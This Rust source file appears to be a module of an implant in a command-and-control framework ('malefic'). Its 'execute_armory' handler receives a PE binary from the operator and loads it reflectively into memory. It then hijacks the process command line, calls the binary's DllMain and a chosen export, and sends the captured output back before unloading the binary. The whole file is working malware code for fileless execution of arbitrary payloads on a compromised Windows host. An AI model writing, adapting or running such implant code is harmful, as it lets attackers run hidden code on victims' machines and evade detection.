use crate::{check_request, Module, Result, TaskResult};
use async_trait::async_trait;
use core::ffi::c_void;
use futures::channel::mpsc::{unbounded, UnboundedReceiver, UnboundedSender};
use futures::executor::block_on;
use futures::StreamExt;
use malefic_helper::common::utils::format_cmdline;
use malefic_helper::to_error;
use malefic_helper::win::kit::func::get_func_addr;
use malefic_helper::win::kit::pe::{hijack_commandline, load_pe};
use malefic_helper::win::kit::MaleficModule;
use malefic_helper::win::types::DllMain;
use malefic_proto::proto::implantpb::spite::Body;
use malefic_proto::proto::modulepb::BinaryResponse;
use malefic_trait::module_impl;
use std::ptr::null_mut;
use std::sync::{Arc, Mutex};

lazy_static::lazy_static! {
    static ref ARMORY_CHANNEL: Arc<Mutex<(UnboundedSender<String>, UnboundedReceiver<String>)>> = {
        let (sender, receiver) = unbounded(); // 使用 futures 的 unbounded channel
        Arc::new(Mutex::new((sender, receiver)))
    };
}

const SUCCESS: usize = 0;
type ArmoryCallback = extern "C" fn(*const c_void, usize) -> usize;
type ArmoryFunc = extern "C" fn(*const c_void, usize, ArmoryCallback) -> usize;

pub extern "C" fn armory_callback(data: *const c_void, data_len: usize) -> usize {
    let channel = ARMORY_CHANNEL.clone();
    let final_data;
    if data_len > 0 && !data.is_null() {
        let out_bytes: &[u8] = unsafe { core::slice::from_raw_parts(data as *const u8, data_len) };
        final_data = String::from_utf8(out_bytes.to_vec()).unwrap_or_default();
    } else {
        final_data = "Received null data or zero length.".to_string();
    }
    block_on(async {
        if let Ok(channel) = channel.lock() {
            let _ = channel.0.unbounded_send(final_data); // 使用 unbounded_send 替代 send
        }
    });
    SUCCESS
}

pub struct ExecuteArmory {}

#[async_trait]
#[module_impl("execute_armory")]
impl Module for ExecuteArmory {}

#[async_trait]
impl crate::ModuleImpl for ExecuteArmory {

    #[allow(unused_variables)]
    async fn run(
        &mut self,
        id: u32,
        receiver: &mut crate::Input,
        sender: &mut crate::Output,
    ) -> Result {
        let request = check_request!(receiver, Body::ExecuteBinary)?;
        let name = request.name + "\x00";
        let entrypoint = request.entry_point;
        let bin = request.bin;
        let need_output = request.output;
        let mut ret: Vec<u8> = Vec::new();
        let par = if request.args.is_empty() {
            None
        } else {
            Some(format_cmdline(request.process_name, request.args))
        };
        unsafe {
            let armory = load_pe(bin, None, None) as *const MaleficModule;
            if armory.is_null() {
                return to_error!(Err("Armory load failed, Failed to load PE file".to_string()));
            }
            hijack_commandline(&par);
            let armory_entrypoint = get_func_addr((*armory).new_module as _, entrypoint);
            if armory_entrypoint.is_null() {
                return to_error!(Err("Failed to get entrypoint function address".to_string()));
            }

            let args = par.unwrap_or_default() + "\x00";
            let _ = std::mem::transmute::<usize, DllMain>((*armory).entry_point as _)(
                (*armory).new_module as _,
                1,
                null_mut(),
            );
            let _ = std::mem::transmute::<usize, ArmoryFunc>(armory_entrypoint as _)(
                args.as_ptr() as _,
                args.len(),
                armory_callback,
            );
            let receiver = ARMORY_CHANNEL.clone();
            block_on(async {
                if let Ok(mut channel_guard) = receiver.lock() {
                    if let Some(data) = channel_guard.1.next().await {
                        ret = data.as_bytes().to_vec();
                    }
                }
                malefic_helper::win::kit::pe::unload_pe(armory as _);
            });
        }

        Ok(TaskResult::new_with_body(
            id,
            Body::BinaryResponse(BinaryResponse {
                status: 0,
                message: Vec::new(),
                data: ret,
                err: "".to_string(),
            }),
        ))
    }

}